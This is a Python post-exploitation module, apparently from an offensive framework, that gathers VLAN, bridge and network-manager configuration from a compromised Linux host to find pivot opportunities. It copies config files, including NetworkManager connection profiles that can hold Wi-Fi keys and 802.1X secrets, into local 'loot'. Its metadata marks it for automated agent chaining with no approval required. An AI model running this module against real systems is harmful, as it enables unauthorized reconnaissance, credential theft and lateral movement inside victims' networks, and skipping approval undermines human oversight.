#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Gather VLAN, trunk, and bridge configuration from a Linux shell session."""

from __future__ import annotations

import json
import os
import re
from typing import Dict, List

from kittysploit import *
from lib.post.linux.system import System
from lib.post.linux.session import LinuxSessionMixin


class Module(Post, System, LinuxSessionMixin):
    __info__ = {
        "name": "Linux Gather VLAN Profiles",
        "description": (
            "Collect VLAN subinterfaces, trunk/bridge settings, and network manager "
            "profiles from a compromised Linux host to map virtual LAN segmentation "
            "and pivot opportunities."
        ),
        "platform": Platform.LINUX,
        "author": ["KittySploit Team"],
        "session_type": [
            SessionType.SHELL,
            SessionType.METERPRETER,
            SessionType.SSH,
        ],
        "references": [
            "https://attack.mitre.org/techniques/T1016/",
        ],
        "agent": {
            "risk": "passive",
            "effects": ["discovery"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "evidence"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.2,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": [],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": ["shell"],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [{"capability": "vlan_segment", "from_detail": "vlan_id"}],
                "consumes_capabilities": [{"capability": "shell", "from_detail": ""}],
                "option_bindings": {},
                "suggested_followups": ["auxiliary/scanner/vlan/id_scan"],
            },
        },
    }

    save_loot = OptBool(True, "Save collected VLAN profile data under ./loot", required=False)

    _CONFIG_PATHS = (
        "/etc/network/interfaces",
        "/etc/netplan",
        "/etc/NetworkManager/system-connections",
        "/etc/sysconfig/network-scripts",
        "/etc/systemd/network",
    )

    def check(self):
        session_id_value = (
            self.session_id.value if hasattr(self.session_id, "value") else str(self.session_id)
        )
        if not session_id_value or not str(session_id_value).strip():
            print_error("Session ID not set")
            return False
        if not self.framework or not getattr(self.framework, "session_manager", None):
            print_error("Framework or session manager not available")
            return False
        session = self.framework.session_manager.get_session(str(session_id_value).strip())
        if not session:
            print_error(f"Session {session_id_value} not found")
            return False
        return True

    def run(self):

        if not self.linux_require_linux():
            return False

        print_status("Gathering Linux VLAN and trunk configuration...")
        report: Dict[str, object] = {
            "vlan_interfaces": [],
            "bridge_vlans": [],
            "proc_vlan_config": "",
            "ip_link_details": "",
            "config_files": {},
            "nmcli": "",
            "discovered_vlan_ids": [],
        }

        report["vlan_interfaces"] = self._collect_vlan_interfaces()
        report["bridge_vlans"] = self._collect_bridge_vlans()
        report["proc_vlan_config"] = self._read_text("/proc/net/vlan/config")
        report["ip_link_details"] = self._cmd("ip -d link show 2>/dev/null")
        report["config_files"] = self._collect_config_files()
        report["nmcli"] = self._collect_nmcli()
        report["discovered_vlan_ids"] = self._extract_vlan_ids(report)

        self._print_summary(report)

        if bool(self.save_loot):
            hostname = self._clean(self._cmd("hostname 2>/dev/null")) or "linux"
            safe_host = re.sub(r"[^a-zA-Z0-9._-]+", "_", hostname)
            out_rel = os.path.join("loot", f"vlan_profiles_{safe_host}.json")
            if self.write_out_dir(out_rel, json.dumps(report, indent=2)):
                print_success(f"Saved VLAN profile loot to {out_rel}")
            else:
                print_warning("Could not save loot output")

        # Gather modules succeed when collection completes — empty results are valid.
        return True

    def _cmd(self, command: str) -> str:
        output = self.linux_execute(command)
        return output if output else ""

    def _clean(self, text: str) -> str:
        if not text:
            return ""
        cleaned = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", str(text))
        lines = [line.strip() for line in cleaned.replace("\r", "\n").splitlines() if line.strip()]
        return lines[-1] if lines else ""

    def _read_text(self, path: str) -> str:
        if not self.file_exist(path):
            return ""
        try:
            content = self.read_file(path)
        except Exception:
            return ""
        return str(content or "")

    def _collect_vlan_interfaces(self) -> List[Dict[str, str]]:
        entries: List[Dict[str, str]] = []
        listing = self._cmd("ls -1 /sys/class/net 2>/dev/null")
        if not listing:
            return entries

        for iface in listing.splitlines():
            iface = iface.strip()
            if not iface:
                continue
            parent = self._read_text(f"/sys/class/net/{iface}/parent").strip()
            if not parent:
                continue
            vid = self._read_text(f"/sys/class/net/{iface}/vlanid").strip()
            flags = self._read_text(f"/sys/class/net/{iface}/flags").strip()
            addr = self._clean(self._cmd(f"cat /sys/class/net/{iface}/address 2>/dev/null"))
            entry = {
                "interface": iface,
                "parent": parent,
                "vlan_id": vid,
                "flags": flags,
                "mac": addr,
            }
            entries.append(entry)
            print_success(f"VLAN iface {iface} on {parent} (id={vid or '?'})")
        return entries

    def _collect_bridge_vlans(self) -> List[str]:
        lines: List[str] = []
        if not self.command_exists("bridge"):
            return lines
        output = self._cmd("bridge vlan show 2>/dev/null")
        if not output:
            return lines
        for line in output.splitlines():
            stripped = line.strip()
            if not stripped:
                continue
            lines.append(stripped)
            if "vlan" in stripped.lower():
                print_info(f"  {stripped}")
        return lines

    def _collect_config_files(self) -> Dict[str, str]:
        collected: Dict[str, str] = {}
        for path in self._CONFIG_PATHS:
            if self.file_exist(path):
                if path.endswith("netplan") or path.endswith("system-connections") or path.endswith("network-scripts") or path.endswith("network"):
                    listing = self._cmd(f'find "{path}" -maxdepth 2 -type f 2>/dev/null | head -40')
                    if listing:
                        for item in listing.splitlines():
                            item = item.strip()
                            if not item:
                                continue
                            content = self._read_text(item)
                            if content:
                                collected[item] = content[:8000]
                else:
                    content = self._read_text(path)
                    if content:
                        collected[path] = content[:8000]
                        print_info(f"Collected config: {path}")
        return collected

    def _collect_nmcli(self) -> str:
        if not self.command_exists("nmcli"):
            return ""
        output = self._cmd("nmcli -f NAME,UUID,TYPE,DEVICE connection show 2>/dev/null")
        if output:
            print_info("NetworkManager connections:")
            for line in output.splitlines()[:20]:
                if line.strip():
                    print_info(f"  {line.strip()}")
        detail = self._cmd("nmcli -t -f NAME,802-3-ethernet.cloned-mac-address,ipv4.method,connection.interface-name connection show 2>/dev/null")
        return (output + "\n" + detail).strip()

    def _extract_vlan_ids(self, report: Dict[str, object]) -> List[int]:
        ids: List[int] = []
        for entry in report.get("vlan_interfaces", []):
            raw = str(entry.get("vlan_id", "")).strip()
            if raw.isdigit():
                ids.append(int(raw))

        patterns = (
            r"\bvlan\s*(\d{1,4})\b",
            r"\bid\s*(\d{1,4})\b",
            r"\bVID:\s*(\d{1,4})\b",
            r"\b802-1q\s*(\d{1,4})\b",
        )
        blobs = [
            str(report.get("proc_vlan_config", "")),
            str(report.get("ip_link_details", "")),
            str(report.get("nmcli", "")),
        ]
        blobs.extend(str(content) for content in report.get("config_files", {}).values())

        for blob in blobs:
            for pattern in patterns:
                for match in re.finditer(pattern, blob, flags=re.IGNORECASE):
                    value = int(match.group(1))
                    if 1 <= value <= 4094:
                        ids.append(value)

        unique = sorted(set(ids))
        if unique:
            print_success(f"Discovered VLAN IDs: {', '.join(str(v) for v in unique)}")
        else:
            print_warning("No explicit VLAN IDs found on this host")
        return unique

    def _print_summary(self, report: Dict[str, object]) -> None:
        print_info("=" * 72)
        print_status("VLAN profile summary")
        vlan_ifaces = report.get("vlan_interfaces", [])
        print_info(f"VLAN subinterfaces: {len(vlan_ifaces)}")
        bridge_vlans = report.get("bridge_vlans", [])
        if bridge_vlans:
            print_info(f"Bridge VLAN entries: {len(bridge_vlans)}")
        config_files = report.get("config_files", {})
        if config_files:
            print_info(f"Config files collected: {len(config_files)}")
        proc_cfg = str(report.get("proc_vlan_config", "")).strip()
        if proc_cfg:
            print_info("Kernel VLAN config (/proc/net/vlan/config):")
            for line in proc_cfg.splitlines()[:20]:
                if line.strip():
                    print_info(f"  {line.strip()}")
